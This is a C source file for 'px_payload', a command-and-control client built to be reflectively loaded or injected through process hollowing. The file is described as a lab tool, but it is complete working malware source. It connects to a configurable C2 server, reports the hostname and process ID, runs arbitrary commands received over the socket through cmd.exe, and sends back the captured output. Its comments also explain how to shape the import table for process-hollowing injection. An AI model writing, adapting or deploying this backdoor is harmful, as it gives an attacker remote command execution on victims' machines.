/*
 * PHANTOM-X :: phase3_fileless/loader/px_payload.c
 * =============================================================================
 * px_payload.exe -- lab C2 client, built as a REFLECTIVE-LOADABLE PE.
 *
 * WHAT IT DOES
 *   1. Writes a marker file recording that it executed (evidence for the lab).
 *   2. Connects to the lab C2 server over TCP.
 *   3. Sends HELLO with arch / pid / hostname.
 *   4. Enters a command loop: answers PING, executes EXEC commands via
 *      cmd.exe with stdout+stderr captured, returns the output.
 *   5. Exits cleanly on EXIT.
 *
 * WHY THIS FILE HAS NO C RUNTIME
 *   The payload is executed by px_loader.exe, which maps the PE image by
 *   hand: headers, sections, relocations, imports. It does NOT register the
 *   image with the Windows loader, so the loader never assigns this module
 *   a thread-local-storage index.
 *
 *   A normally built MinGW executable cannot run that way. Its CRT startup
 *   (mainCRTStartup) reaches module TLS state that was never initialised,
 *   and the process faults immediately. This was observed, not assumed:
 *   the mapped image crashed inside the CRT entry point with a read from a
 *   wild TLS-derived address.
 *
 *   The fix is to remove the dependency rather than to fake loader state.
 *   This translation unit is built with -nostdlib and a custom entry point,
 *   and it uses only Win32 APIs plus its own string and memory helpers.
 *   Nothing in here needs a TLS index, a CRT, or an initialised heap.
 *
 * SCOPE AND DELIBERATE OMISSIONS
 *   A laboratory instrument for a personally owned, isolated Windows VM.
 *   Deliberately PLAIN: no obfuscation, no packing, no encryption, no AMSI
 *   bypass, no ETW unhooking, no stealth protocol, no domain generation, no
 *   persistence, no privilege escalation, no credential access.
 *
 *   Plain is deliberate: the payload must be observable by Defender and
 *   Sysmon so that the research question ("what does the endpoint see?")
 *   can actually be answered. A silent payload yields no signal.
 *
 * PROTOCOL (line oriented, UTF-8)
 *   client -> server   HELLO|<arch>|<pid>|<hostname>
 *                      PONG
 *                      RESULT|<cmd_id>|<base64 output>|<exit_code>
 *   server -> client   PING
 *                      EXEC|<cmd_id>|<command line>
 *                      EXIT
 *
 * BUILD (MinGW x64):
 *   x86_64-w64-mingw32-gcc -O2 -Wall -nostdlib -ffreestanding -fno-builtin \
 *       -Wl,--entry=px_entry -o px_payload.exe px_payload.c -lkernel32
 */

#define _WIN32_WINNT 0x0601
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <stddef.h>

/* Winsock is resolved AT RUNTIME via LoadLibraryA/GetProcAddress so that the
 * static import table contains KERNEL32.dll only.
 *
 * Why that matters: for process hollowing the loader must write resolved
 * import addresses into the TARGET process's IAT. It can only do that for
 * modules the target already has loaded. Every Windows process has
 * kernel32.dll; most do NOT have ws2_32.dll. Resolving Winsock at runtime
 * keeps the static import surface to the one module that is always present.
 * The payload loads ws2_32.dll itself once it is running. */
typedef UINT_PTR PX_SOCKET;
typedef struct px_sockaddr_in {
    short sin_family;
    unsigned short sin_port;
    unsigned long sin_addr;
    char sin_zero[8];
} PX_SOCKADDR_IN;

#define PX_INVALID_SOCKET ((PX_SOCKET)~0)
#define PX_SOCK_STREAM 1
#define PX_AF_INET 2
#define PX_SOMAXCONN 0x7fffffff
#define PX_WSAAPI __stdcall

typedef int (PX_WSAAPI *fn_wsastartup)(unsigned short, void *);
typedef int (PX_WSAAPI *fn_wsacleanup)(void);
typedef PX_SOCKET (PX_WSAAPI *fn_socket)(int, int, int);
typedef int (PX_WSAAPI *fn_connect)(PX_SOCKET, const PX_SOCKADDR_IN *, int);
typedef int (PX_WSAAPI *fn_send)(PX_SOCKET, const char *, int, int);
typedef int (PX_WSAAPI *fn_recv)(PX_SOCKET, char *, int, int);
typedef int (PX_WSAAPI *fn_closesocket)(PX_SOCKET);
typedef unsigned long (PX_WSAAPI *fn_inet_addr)(const char *);
typedef unsigned short (PX_WSAAPI *fn_htons)(unsigned short);
typedef int (PX_WSAAPI *fn_getlasterror)(void);

/* WSADATA is filled in by WSAStartup; it must be a valid buffer, not NULL.
 * Layout mirrors wincrypt/winsock: version fields, limits, then the two
 * 256/128 byte description strings. */
typedef struct px_wsadata {
    unsigned short wVersion;
    unsigned short wHighVersion;
    unsigned short iMaxSockets;
    unsigned short iMaxUdpDg;
    char *lpVendorInfo;
    char szDescription[257];
    char szSystemStatus[129];
} PX_WSADATA;

/* GetProcAddress returns FARPROC; casting it to a specific signature is the
 * documented usage, but GCC warns about it. Route through a void* helper so
 * the intent is explicit and the build stays warning-free. */
static void *px_proc(HMODULE h, const char *name)
{
    return (void *)GetProcAddress(h, name);
}

/* ================================================================== */
/* freestanding runtime helpers                                       */
/* ================================================================== */
/* NOTE: size_t comes from <stddef.h>. On Win64 'unsigned long' is still
 * 32-bit (LLP64), so it must never be used for a length or a pointer. */
typedef size_t px_size_t;

void *memcpy(void *dst, const void *src, size_t n)
{
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    while (n--)
        *d++ = *s++;
    return dst;
}

void *memset(void *dst, int c, size_t n)
{
    unsigned char *d = (unsigned char *)dst;
    while (n--)
        *d++ = (unsigned char)c;
    return dst;
}

void *memmove(void *dst, const void *src, size_t n)
{
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    if (d == s || n == 0)
        return dst;
    if (d < s) {
        while (n--)
            *d++ = *s++;
    } else {
        d += n;
        s += n;
        while (n--)
            *--d = *--s;
    }
    return dst;
}

static px_size_t px_strlen(const char *s)
{
    px_size_t n = 0;
    while (s[n])
        n++;
    return n;
}

static int px_strncmp(const char *a, const char *b, px_size_t n)
{
    while (n--) {
        if (*a != *b)
            return (unsigned char)*a - (unsigned char)*b;
        if (!*a)
            return 0;
        a++;
        b++;
    }
    return 0;
}

static char *px_strchr(const char *s, int c)
{
    for (; *s; s++) {
        if (*s == (char)c)
            return (char *)s;
    }
    return NULL;
}

/* ================================================================== */
/* tiny formatting + logging (no CRT)                                 */
/* ================================================================== */
static px_size_t px_strcpy(char *dst, const char *src, px_size_t cap);

/* Build "<dir of the running image>\<name>" and return it. */
static void px_path_next_to_image(char *out, px_size_t cap, const char *name)
{
    char dir[MAX_PATH];
    px_size_t l;
    if (!GetModuleFileNameA(NULL, dir, MAX_PATH)) {
        px_strcpy(dir, ".", MAX_PATH);
    } else {
        char *slash = px_strchr(dir, '\\');
        if (slash)
            *slash = '\0';
        else
            px_strcpy(dir, ".", MAX_PATH);
    }
    l = px_strcpy(out, dir, cap);
    if (l + 1 < cap) {
        out[l] = '\\';
        out[l + 1] = '\0';
        px_strcpy(out + l + 1, name, cap - (l + 1));
    }
}

static void px_emit(const char *buf, px_size_t len)
{
    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD written = 0;

    /* stdout, when there is one */
    if (h != INVALID_HANDLE_VALUE && h != NULL)
        WriteFile(h, buf, (DWORD)len, &written, NULL);

    /* A hollowed process is a GUI process with no console, so stdout may
     * be absent. Always mirror the log to a file next to the image so the
     * run is observable no matter what the host process is. */
    {
        char path[MAX_PATH];
        HANDLE f;
        px_path_next_to_image(path, MAX_PATH, "px_payload_log.txt");
        f = CreateFileA(path, FILE_APPEND_DATA,
                        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (f != INVALID_HANDLE_VALUE) {
            WriteFile(f, buf, (DWORD)len, &written, NULL);
            CloseHandle(f);
        }
    }
}

static px_size_t px_strcpy(char *dst, const char *src, px_size_t cap)
{
    px_size_t i = 0;
    while (src[i] && i + 1 < cap) {
        dst[i] = src[i];
        i++;
    }
    dst[i] = '\0';
    return i;
}

static px_size_t px_utoa(unsigned long v, char *out)
{
    char tmp[24];
    int n = 0, i;
    if (v == 0) {
        out[0] = '0';
        out[1] = '\0';
        return 1;
    }
    while (v) {
        tmp[n++] = (char)('0' + (v % 10));
        v /= 10;
    }
    for (i = 0; i < n; i++)
        out[i] = tmp[n - 1 - i];
    out[n] = '\0';
    return (px_size_t)n;
}

/* Format into a caller buffer. Supports %s %d %u %x %p %%. */
static px_size_t px_vfmt(char *out, px_size_t cap, const char *fmt,
                         __builtin_va_list ap)
{
    px_size_t o = 0;
    while (*fmt && o + 1 < cap) {
        if (*fmt != '%') {
            out[o++] = *fmt++;
            continue;
        }
        fmt++;
        if (*fmt == '%') {
            out[o++] = '%';
            fmt++;
            continue;
        }
        if (*fmt == 's') {
            const char *s = __builtin_va_arg(ap, const char *);
            if (!s)
                s = "(null)";
            while (*s && o + 1 < cap)
                out[o++] = *s++;
            fmt++;
            continue;
        }
        if (*fmt == 'd' || *fmt == 'u' || *fmt == 'x' || *fmt == 'p') {
            unsigned long v = __builtin_va_arg(ap, unsigned long);
            char tmp[24];
            if (*fmt == 'x') {
                const char *hex = "0123456789abcdef";
                int i = 0;
                if (!v)
                    tmp[i++] = '0';
                while (v && i < 20) {
                    tmp[i++] = hex[v & 0xF];
                    v >>= 4;
                }
                {
                    int j;
                    for (j = 0; j < i && o + 1 < cap; j++)
                        out[o++] = tmp[i - 1 - j];
                }
            } else {
                px_size_t k = px_utoa(v, tmp);
                px_size_t j;
                for (j = 0; j < k && o + 1 < cap; j++)
                    out[o++] = tmp[j];
            }
            fmt++;
            continue;
        }
        out[o++] = '%';
    }
    out[o] = '\0';
    return o;
}

static px_size_t px_fmt(char *out, px_size_t cap, const char *fmt, ...)
{
    __builtin_va_list ap;
    px_size_t n;
    __builtin_va_start(ap, fmt);
    n = px_vfmt(out, cap, fmt, ap);
    __builtin_va_end(ap);
    return n;
}

static void px_logf(const char *fmt, ...)
{
    char buf[2048];
    __builtin_va_list ap;
    px_size_t n;
    __builtin_va_start(ap, fmt);
    n = px_vfmt(buf, sizeof(buf), fmt, ap);
    __builtin_va_end(ap);
    px_emit(buf, n);
}

/* ================================================================== */
/* base64                                                             */
/* ================================================================== */
static const char B64[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static char *b64_encode(const unsigned char *in, px_size_t len)
{
    px_size_t out_len = ((len + 2) / 3) * 4;
    char *out = (char *)HeapAlloc(GetProcessHeap(), 0, out_len + 1);
    px_size_t i, o = 0;

    if (!out)
        return NULL;
    for (i = 0; i + 2 < len; i += 3) {
        unsigned v = (in[i] << 16) | (in[i + 1] << 8) | in[i + 2];
        out[o++] = B64[(v >> 18) & 0x3F];
        out[o++] = B64[(v >> 12) & 0x3F];
        out[o++] = B64[(v >> 6) & 0x3F];
        out[o++] = B64[v & 0x3F];
    }
    if (i < len) {
        unsigned v = in[i] << 16;
        px_size_t rem = len - i;
        if (rem == 2)
            v |= in[i + 1] << 8;
        out[o++] = B64[(v >> 18) & 0x3F];
        out[o++] = B64[(v >> 12) & 0x3F];
        out[o++] = (rem == 2) ? B64[(v >> 6) & 0x3F] : '=';
        out[o++] = '=';
    }
    out[o] = '\0';
    return out;
}

/* ================================================================== */
/* helpers                                                            */
/* ================================================================== */
static int send_all(PX_SOCKET s, const char *buf, int len, fn_send p_send)
{
    int sent = 0;
    while (sent < len) {
        int n = p_send(s, buf + sent, len - sent, 0);
        if (n <= 0)
            return -1;
        sent += n;
    }
    return 0;
}

static void write_marker(void)
{
    char full[MAX_PATH];
    HANDLE h;
    char host[256];
    DWORD hn = sizeof(host);
    SYSTEMTIME st;
    char line[512];
    px_size_t n;

    GetLocalTime(&st);
    GetComputerNameA(host, &hn);

    px_path_next_to_image(full, MAX_PATH, "px_payload_running.txt");

    h = CreateFileA(full, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                    OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return;
    SetFilePointer(h, 0, NULL, FILE_END);

    n = px_fmt(line, sizeof(line),
               "px_payload executed\r\n  pid  : %u\r\n  host : %s\r\n"
               "  time : %04u-%02u-%02u %02u:%02u:%02u\r\n",
               (unsigned long)GetCurrentProcessId(), host,
               (unsigned long)st.wYear, (unsigned long)st.wMonth,
               (unsigned long)st.wDay, (unsigned long)st.wHour,
               (unsigned long)st.wMinute, (unsigned long)st.wSecond);
    WriteFile(h, line, (DWORD)n, NULL, NULL);
    CloseHandle(h);
}

/* ================================================================== */
/* command execution with captured output                             */
/* ================================================================== */
static char *run_command(const char *cmd, long *exit_code)
{
    SECURITY_ATTRIBUTES sa;
    HANDLE rd, wr;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    wchar_t wbuf[2048];
    wchar_t wcmd[3072];
    char *buf;
    px_size_t cap = 32768, len = 0;
    int wlen;
    DWORD got;

    *exit_code = -1;

    wlen = MultiByteToWideChar(CP_ACP, 0, cmd, -1, wbuf, 2048);
    if (wlen <= 0)
        wbuf[0] = L'\0';
    else
        wbuf[2047] = L'\0';

    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&rd, &wr, &sa, 0))
        return NULL;
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = wr;
    si.hStdError = wr;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

    {
        /* build "cmd.exe /d /s /c "<cmd>"" without CRT formatting */
        const char *a = "cmd.exe /d /s /c \"";
        int i = 0, j;
        for (j = 0; a[j] && i < 3000; j++, i++)
            wcmd[i] = (wchar_t)(unsigned char)a[j];
        for (j = 0; wbuf[j] && i < 3000; j++, i++)
            wcmd[i] = wbuf[j];
        if (i < 3000)
            wcmd[i++] = L'"';
        wcmd[i] = L'\0';
    }

    memset(&pi, 0, sizeof(pi));
    if (!CreateProcessW(NULL, wcmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(rd);
        CloseHandle(wr);
        return NULL;
    }
    CloseHandle(wr);

    buf = (char *)HeapAlloc(GetProcessHeap(), 0, cap);
    if (!buf) {
        CloseHandle(rd);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return NULL;
    }

    for (;;) {
        if (len + 4096 > cap) {
            char *nb;
            cap *= 2;
            nb = (char *)HeapReAlloc(GetProcessHeap(), 0, buf, cap);
            if (!nb)
                break;
            buf = nb;
        }
        if (!ReadFile(rd, buf + len, 4096, &got, NULL) || got == 0)
            break;
        len += got;
    }

    WaitForSingleObject(pi.hProcess, 15000);
    GetExitCodeProcess(pi.hProcess, (DWORD *)exit_code);

    CloseHandle(rd);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (!buf)
        return NULL;
    buf[len] = '\0';
    return buf;
}

/* ================================================================== */
/* entry point                                                        */
/* ================================================================== */
#ifndef PX_DEFAULT_HOST
#define PX_DEFAULT_HOST "127.0.0.1"
#endif
#ifndef PX_DEFAULT_PORT
#define PX_DEFAULT_PORT 9001
#endif

/* Read a string from the environment. WinAPI only -- no CRT involved.
 * Used so the lab operator can retarget the payload at the operator host
 * without recompiling. */
static int px_env(const char *name, char *out, int cap)
{
    DWORD n = GetEnvironmentVariableA(name, out, (DWORD)cap);
    if (n == 0 || n >= (DWORD)cap)
        return 0;
    return 1;
}

__declspec(dllexport) void px_entry(void)
{
    PX_SOCKET sock;
    PX_SOCKADDR_IN addr;
    static char recvbuf[16384];
    px_size_t used = 0;
    char host[256];
    DWORD hn = sizeof(host);
    const char *c2host = PX_DEFAULT_HOST;
    int c2port = PX_DEFAULT_PORT;
    int is64 = 0;
    char env_host[256];
    char env_port[256];
    fn_wsastartup p_wsastartup = NULL;
    fn_wsacleanup p_wsacleanup = NULL;
    fn_socket p_socket = NULL;
    fn_connect p_connect = NULL;
    fn_send p_send = NULL;
    fn_recv p_recv = NULL;
    fn_closesocket p_closesocket = NULL;
    fn_inet_addr p_inet_addr = NULL;
    fn_htons p_htons = NULL;
    fn_getlasterror p_wsalasterror = NULL;
    PX_WSADATA wsa;

    write_marker();

    /* PX_C2_HOST / PX_C2_PORT override the compiled-in defaults.
     * NOTE: two separate buffers. They must not alias: c2host points at
     * env_host, so reusing one buffer for both reads would clobber the
     * host with the port string. */
    if (px_env("PX_C2_HOST", env_host, sizeof(env_host)) && env_host[0])
        c2host = env_host;
    if (px_env("PX_C2_PORT", env_port, sizeof(env_port)) && env_port[0]) {
        int p = 0;
        const char *c = env_port;
        while (*c >= '0' && *c <= '9')
            p = p * 10 + (*c++ - '0');
        if (p > 0 && p < 65536)
            c2port = p;
    }

    write_marker();

    {
        HMODULE hws;
        hws = LoadLibraryA("ws2_32.dll");
        if (!hws) {
            px_logf("[px] LoadLibrary ws2_32 failed (%u)\n",
                    (unsigned long)GetLastError());
            return;
        }
        p_wsastartup = (fn_wsastartup)px_proc(hws, "WSAStartup");
        p_wsacleanup = (fn_wsacleanup)px_proc(hws, "WSACleanup");
        p_socket = (fn_socket)px_proc(hws, "socket");
        p_connect = (fn_connect)px_proc(hws, "connect");
        p_send = (fn_send)px_proc(hws, "send");
        p_recv = (fn_recv)px_proc(hws, "recv");
        p_closesocket = (fn_closesocket)px_proc(hws, "closesocket");
        p_inet_addr = (fn_inet_addr)px_proc(hws, "inet_addr");
        p_htons = (fn_htons)px_proc(hws, "htons");
        p_wsalasterror = (fn_getlasterror)px_proc(hws, "WSAGetLastError");
        if (!p_wsastartup || !p_socket || !p_connect || !p_send || !p_recv) {
            px_logf("[px] ws2_32 exports missing\n");
            return;
        }
    }
    if (p_wsastartup(0x0202, &wsa) != 0) {
        px_logf("[px] WSAStartup failed\n");
        return;
    }

    {
        SYSTEM_INFO si;
        GetNativeSystemInfo(&si);
        is64 = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64);
    }

    sock = p_socket(PX_AF_INET, PX_SOCK_STREAM, 6);
    if (sock == PX_INVALID_SOCKET) {
        px_logf("[px] socket failed (%u)\n", (unsigned long)p_wsalasterror());
        p_wsacleanup();
        return;
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = PX_AF_INET;
    addr.sin_port = p_htons((unsigned short)c2port);
    addr.sin_addr = p_inet_addr(c2host);

    px_logf("[px] connecting to %s:%d\n", c2host, c2port);
    if (p_connect(sock, &addr, sizeof(addr)) != 0) {
        px_logf("[px] connect failed (%u)\n", (unsigned long)p_wsalasterror());
        p_closesocket(sock);
        p_wsacleanup();
        return;
    }
    px_logf("[px] connected\n");

    GetComputerNameA(host, &hn);
    {
        char line[1024];
        px_size_t n = px_fmt(line, sizeof(line), "HELLO|%s|%u|%s\r\n",
                             is64 ? "x64" : "x86",
                             (unsigned long)GetCurrentProcessId(), host);
        send_all(sock, line, (int)n, p_send);
    }

    for (;;) {
        int n = p_recv(sock, recvbuf + used, (int)(sizeof(recvbuf) - 1 - used), 0);
        px_size_t consumed;

        if (n <= 0) {
            px_logf("[px] connection closed by peer\n");
            break;
        }
        used += (px_size_t)n;
        recvbuf[used] = '\0';

        for (;;) {
            char *line = px_strchr(recvbuf, '\n');
            char *bar1, *bar2;

            if (!line)
                break;
            *line = '\0';
            consumed = (px_size_t)(line - recvbuf) + 1;
            {
                px_size_t ll = px_strlen(recvbuf);
                if (ll && recvbuf[ll - 1] == '\r')
                    recvbuf[ll - 1] = '\0';
            }

            if (px_strncmp(recvbuf, "PING", 4) == 0) {
                send_all(sock, "PONG\r\n", 6, p_send);
            } else if (px_strncmp(recvbuf, "EXIT", 4) == 0) {
                px_logf("[px] EXIT received\n");
                goto done;
            } else if (px_strncmp(recvbuf, "EXEC|", 5) == 0) {
                char *cmd_id = recvbuf + 5;
                char *cmd;
                long rc = -1;
                char *out, *b64;
                static char reply[65536];

                bar1 = px_strchr(cmd_id, '|');
                if (!bar1)
                    goto shift;
                *bar1 = '\0';
                cmd = bar1 + 1;
                bar2 = px_strchr(cmd, '|');
                if (bar2)
                    *bar2 = '\0';

                px_logf("[px] EXEC %s : %s\n", cmd_id, cmd);
                out = run_command(cmd, &rc);
                b64 = b64_encode((const unsigned char *)((out && out[0]) ? out : ""),
                                 out ? px_strlen(out) : 0);
                {
                    px_size_t rn = px_fmt(reply, sizeof(reply),
                                          "RESULT|%s|%s|%ld\r\n",
                                          cmd_id, b64 ? b64 : "", rc);
                    send_all(sock, reply, (int)rn, p_send);
                }
                if (b64)
                    HeapFree(GetProcessHeap(), 0, b64);
                if (out)
                    HeapFree(GetProcessHeap(), 0, out);
            }

        shift:
            {
                px_size_t rest = used - consumed;
                memmove(recvbuf, recvbuf + consumed, rest + 1);
                used = rest;
            }
            if (used == 0)
                break;
        }
    }

done:
    p_closesocket(sock);
    p_wsacleanup();
    px_logf("[px] finished\n");
}
